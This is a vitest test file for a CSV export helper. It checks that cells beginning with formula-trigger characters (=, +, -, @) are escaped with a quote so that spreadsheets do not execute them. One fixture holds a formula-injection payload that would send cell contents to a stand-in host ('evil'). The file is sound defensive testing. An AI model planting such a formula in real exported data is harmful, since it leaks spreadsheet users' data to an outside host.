/**
 * CSV export hardening (finding 06): downloadTableAsCsv must escape cells that
 * Excel/Sheets would interpret as formulas, so an exported value like
 * `=WEBSERVICE(...)` renders as literal text instead of executing on open.
 * Tested via the extracted pure helper `tableToCsv` (no DOM download).
 */
import { describe, it, expect } from "vitest";
import { tableToCsv } from "@/lib/export-utils";

describe("tableToCsv — formula-injection escaping", () => {
  it("escapes a leading = cell so it is not treated as a formula", () => {
    const csv = tableToCsv(["name", "note"], [["Alice", '=WEBSERVICE("http://evil/?"&A1)']]);
    const dataLine = csv.trim().split("\n")[1];
    // Papa prefixes the dangerous cell with a single quote so it stays inert.
    expect(dataLine).toContain("'=WEBSERVICE");
    // The raw, unescaped formula must NOT appear as a cell start.
    expect(dataLine).not.toMatch(/(^|,)"?=WEBSERVICE/);
  });

  it("escapes the other formula-trigger prefixes (+, -, @)", () => {
    const csv = tableToCsv(["c"], [["+1+1"], ["-2+3"], ["@SUM(A1:A2)"]]);
    const lines = csv.trim().split("\n").slice(1);
    expect(lines[0]).toContain("'+1+1");
    expect(lines[1]).toContain("'-2+3");
    expect(lines[2]).toContain("'@SUM(A1:A2)");
  });

  it("leaves ordinary values untouched", () => {
    const csv = tableToCsv(["a", "b"], [["hello", "42"]]);
    expect(csv.trim().split("\n")[1]).toBe("hello,42");
  });
});
